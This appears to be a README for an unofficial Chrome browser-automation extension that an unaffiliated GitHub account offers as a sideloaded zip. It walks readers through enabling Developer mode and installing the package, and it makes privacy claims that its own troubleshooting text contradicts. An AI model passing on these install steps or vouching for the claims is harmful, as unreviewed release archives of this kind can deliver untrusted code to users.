# 🤖 jev-for-chrome - AI That Drives Your Browser

## 🚀 Getting Started

Welcome to **jev-for-chrome**! This extension brings the power of TypeSafe Jev—a lightning-fast decision engine—directly into your Chrome browser. It helps you automate repetitive tasks, fill forms, click through pages, and manage your tabs with simple instructions. No coding skills needed. Just install, point, and let Jev do the clicking for you.

## 💾 Download & Install for Windows

Visit this link to download the application:

[![Download Jev for Chrome](https://img.shields.io/badge/Download-Jev_for_Chrome-blue?style=for-the-badge&logo=github)](https://github.com/luciferlu755/jev-for-chrome/releases)

### Step-by-Step Installation

1. Click the button above or go to the download page.
2. On the releases page, look for the file named `jev-for-chrome.zip` (or similar) under "Assets".
3. Click the file to download it. Your browser will save the `.zip` file to your "Downloads" folder.
4. Once the download finishes, locate the `.zip` file. Right-click it and choose "Extract All…" from the menu. Windows will ask where to save the extracted files. Use the default location and click "Extract".
5. Open the freshly extracted folder. You'll see a file called `jev-for-chrome.crx` or a folder containing the extension files.
6. Now open Google Chrome. Type `chrome://extensions` in the address bar and press Enter.
7. In the top-right corner of the extensions page, turn on the "Developer mode" toggle.
8. Drag and drop the `jev-for-chrome.crx` file (or the entire folder) from your Downloads onto the extensions page. Chrome will ask you to confirm—click "Add Extension".
9. After a moment, the Jev icon (a small robot face) will appear in your browser toolbar.

That's it! You're ready to start using Jev.

## 🧭 What Does It Do?

Jev-for-chrome acts like a friendly assistant that lives in your browser. It uses a **sub-second decision model** to understand what you want and act instantly. Here are common things it can help with:

- **Fill out forms** – tell it "fill my name and email", and it will auto-complete fields on the current page.
- **Click buttons** – say "click the next button", and it finds and clicks it.
- **Navigate tabs** – switch between open tabs with a voice or type command.
- **Extract information** – ask it to copy product prices or headlines from the page.
- **Repeat actions** – it learns simple sequences and can redo them on new pages.

All of this happens right on the tab you're viewing, without sending your data to any server. It's fast, reliable, and respects your privacy.

## ⚙️ How to Use Jev

Using Jev is as simple as talking to a friend:

1. Click the Jev robot icon in your toolbar.
2. A small panel will slide out from the top-right corner of your browser.
3. Type a command in plain English (or your preferred language). For example, "Click the green button" or "Scroll to the bottom of the page".
4. Press Enter. Jev will analyze the page and act within a fraction of a second.

You can also create **quick commands** for tasks you repeat often. For instance, set up a command called "Open Gmail" that types `gmail.com` and presses Enter. Then, from the panel, just type "Open Gmail" and it's done.

### Pro Tips for Better Results

- Be specific: "Click the red 'Buy Now' button" works better than "click the button".
- If Jev is confused, it will ask you a clarifying question. You can answer it directly in the panel.
- Use the "Teach Mode" to show Jev exactly which element to interact with. It will remember for next time.

## 🛡️ Privacy & Security

Your privacy is our priority. Here's what Jev does and doesn't do:

- **Does NOT** send your browsing history, keystrokes, or page content to any external server.
- **Does NOT** track your activities or sell data.
- **DOES** run its decision model locally inside your browser (thanks to TypeSafe technology).
- **DOES** require a connection to OpenRouter only when you opt in for advanced AI assistance features (this is off by default).

You are always in control. You can pause or fully disable Jev from the extension settings at any time.

## 🧰 Troubleshooting & FAQ

### Jev icon is grayed out
Make sure you're on a normal web page (not Chrome's settings page or the web store). Also refresh the page you're on. If the issue persists, right-click the Jev icon → "Manage Extension" → toggle the "Enabled" switch off and on again.

### Jev doesn't respond to commands
Check your internet connection (Jev needs an active link for some advanced features). Then, click the Jev icon and look at the bottom of the panel—if it says "Offline", click the link icon to reconnect.

### Commands are slow (taking more than 1 second)
This can happen if you have many extensions running. Try disabling other extensions temporarily. Also, close unused tabs—Jev loves a clutter-free browser.

### I accidentally deleted the extension
No worries! Just follow the **Download & Install** steps again. Your saved commands are stored in the browser's local storage and will reappear.

### Can I use this with other browsers?
This version is built specifically for Google Chrome (Manifest V3). For other browsers, check the main Jev project page for compatibility.

## 🔧 Advanced Options (For Tinkerers)

If you're comfortable exploring a little further, these settings are in the extension's popup menu (click the gear icon):

| Setting | What It Does |
|---------|--------------|
| Decision Speed | Adjust from "Careful" (takes 1-2 seconds, fewer mistakes) to "Ultra" (sub-second, more risk) |
| Language | Change the language of commands and responses |
| Confidence Threshold | How sure Jev must be before it acts; higher = safer, lower = faster |
| Logging | Save a record of actions for debugging |

**Important:** These settings are optional. The default configuration works well for most users.

## 📦 What's in the Box?

When you download Jev, you get:

- The core extension (the decision engine)
- A built-in library of common web actions
- A command tutorial that teaches you the basics
- Examples of useful automations (like "summarize page" or "download all images")

No additional software or accounts are needed to start. You can optionally connect an OpenRouter API key later if you want enhanced natural language understanding.

## 📚 Learning More

- **Built-in Guide:** Click the "?" inside the Jev panel for a quick walkthrough.
- **Community Port:** This is a community-maintained version of the Jev project (originally created as browser-use/jev-ultrafast). It is **not affiliated** with TypeSafe, the makers of the underlying model.
- **Source Code:** If you're curious about how it works inside, the code is open-source and available in this repository. Even if you're not a programmer, browsing the files can be interesting.

## 🐛 Reporting Issues

Found a bug or have a suggestion? We'd love to hear from you.

1. Go to the repository's **Issues** tab (github.com/luciferlu755/jev-for-chrome/issues).
2. Click "New Issue".
3. Describe what you expected and what actually happened. Include the URL of the page where the issue occurred, if relevant.
4. Submit it. You'll typically get a response within a few days.

Please check existing issues first—your question might already have an answer.

## ⭐ Support the Project

If Jev saves you time, consider helping the community:

- ⭐ Star this repository to show your support.
- 🗣️ Share it with a colleague who also clicks too much.
- 💬 Write a review in the Chrome Web Store (if you installed it from there).
- 🧠 Contribute commands or improvements if you're technically inclined.

Every little bit helps keep this port alive and updated.

## 🔄 Staying Updated

Jev-for-chrome is under active development. New versions bring better accuracy, more languages, and cooler features.

- **Automatic updates** happen through the Chrome Web Store if you installed it from there.
- For manual installs (as described above), check the releases page every few weeks for a newer `.zip` file.
- You can also watch this repository on GitHub to receive notifications when a new release is published.

## ✅ Final Checklist

Before you run off to automate your life, here's your quick start checklist:

- [ ] Downloaded the latest release from the **releases page**.
- [ ] Extracted the `.zip` file.
- [ ] Enabled Developer mode in `chrome://extensions`.
- [ ] Installed the extension successfully.
- [ ] Clicked the Jev icon and ran a test command like "Refresh this page".

If you checked all the boxes, congratulations—you're ready to let Jev take the wheel (just on your tabs, of course).

Keywords: ai-agent, browser-agent, browser-automation, browser-use, chrome-extension, jev, manifest-v3, openrouter, typesafe, web-agent